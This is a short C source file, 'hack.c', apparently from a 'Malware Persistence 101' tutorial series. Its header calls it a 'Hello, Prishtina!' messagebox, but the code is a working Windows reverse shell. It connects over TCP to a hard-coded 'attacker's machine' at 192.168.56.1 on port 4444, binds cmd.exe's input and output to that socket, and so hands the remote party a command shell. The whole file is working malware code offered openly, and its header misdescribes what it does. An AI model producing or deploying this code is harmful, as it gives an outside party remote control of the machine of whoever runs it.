/*
 * Malware Persistence 101
 * hack.c
 * "Hello, Prishtina!" messagebox
 * author: @cocomelonc
*/
#include <windows.h>
#include <winsock2.h>

int main(int argc, char* argv[]) {
// int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
  WSADATA socketData;
  SOCKET sock;
  struct sockaddr_in addr;
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  // IP and port details for the attacker's machine
  char *attackerIP = "192.168.56.1";
  short attackerPort = 4444;

  // initialize socket library
  WSAStartup(MAKEWORD(2, 2), &socketData);

  // create socket object
  sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  addr.sin_family = AF_INET;
  addr.sin_port = htons(attackerPort);
  addr.sin_addr.s_addr = inet_addr(attackerIP);

  // establish connection to the remote host
  WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL);

  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES;
  si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) sock;

  // initiate cmd.exe with redirected streams
  CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
  exit(0);
}
